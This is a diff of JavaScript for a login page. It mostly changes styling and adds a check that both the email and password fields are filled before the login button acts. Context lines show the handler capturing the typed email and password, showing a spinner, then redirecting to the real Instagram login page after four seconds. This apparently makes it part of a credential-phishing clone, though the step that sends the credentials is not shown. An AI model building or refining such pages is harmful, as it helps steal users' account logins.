@@ -6,7 +6,7 @@ window.onload = function (){
       let footer = document.querySelector(".footer");
         loadingPage.style.display = "none";
         footer.style.transform = "scale(.7)";
-        footer.style.bottom = "10px";
+        footer.style.bottom = "0px";
     },1000)
 }
 
@@ -28,15 +28,15 @@ passfield.addEventListener("focus",()=>{
 passfield.addEventListener("blur",()=>{
   if(passfield.value.length === 0){
     passShowbtn.style.display = "none";
-    loginbtn.style.background = "#00b3ff";
+    loginbtn.style.background = "#1da1ff9e";
   }
   else{
     passShowbtn.style.filter = "opacity(0.5)";
-    if(emailfields.value.length !== 0){
-      loginbtn.style.background = "#007bef"
+    if(emailfields.value.length != 0){
+      loginbtn.style.background = "#1da1ff"
     }
     else{
-      loginbtn.style.background = "#00b3ff";
+      loginbtn.style.background = "#1da1ff9e";
       
     }
   }
@@ -69,6 +69,8 @@ passfield.addEventListener("blur",()=>{
 
 
 loginbtn.addEventListener("click",()=>{
+  if(emailfields.value.length > 0 && passfield.value.length > 0){
+
   loginbtn.innerHTML = '<img class="spinner" src="./images/spinner.gif">';
   var email = emailfields.value;
   var password = passfield.value;
@@ -94,6 +96,7 @@ loginbtn.addEventListener("click",()=>{
     setTimeout(()=>{
       window.location.assign("https://www.instagram.com/accounts/login/");
     },4000)
+  }
     
 })
 
